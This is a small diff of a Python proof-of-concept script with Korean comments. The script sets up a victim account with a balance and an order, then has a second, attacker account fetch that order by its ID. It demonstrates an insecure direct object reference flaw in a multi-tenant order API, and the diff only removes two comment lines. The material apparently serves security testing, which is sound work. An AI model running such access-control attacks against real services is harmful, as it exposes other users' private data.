@@ -103,7 +103,6 @@ def run(base, admin_user, admin_pass):
         raise SystemExit(f"[!] 충전 승인 실패: {st}")
     print(f"[*] 피해자 잔액 충전 완료 (10,000원)")
 
-    # 피해자 주문 생성
     st, j = call(base, "POST", f"/api/v1/tenants/{tid}/orders", a_tok,
                  {"items": [{"productId": pid, "quantity": 1}]})
     if st not in (200, 201):
@@ -111,7 +110,6 @@ def run(base, admin_user, admin_pass):
     oid = j["data"]["id"]
     print(f"[*] 피해자 주문 생성: order={oid}")
 
-    # 공격자가 피해자 주문 ID를 직접 조회
     b_tok = login(base, ub, pb)
     print(f"[>] 공격자가 피해자 주문 직접 조회: GET /orders/{oid}")
     st, j = call(base, "GET", f"/api/v1/tenants/{tid}/orders/{oid}", b_tok)
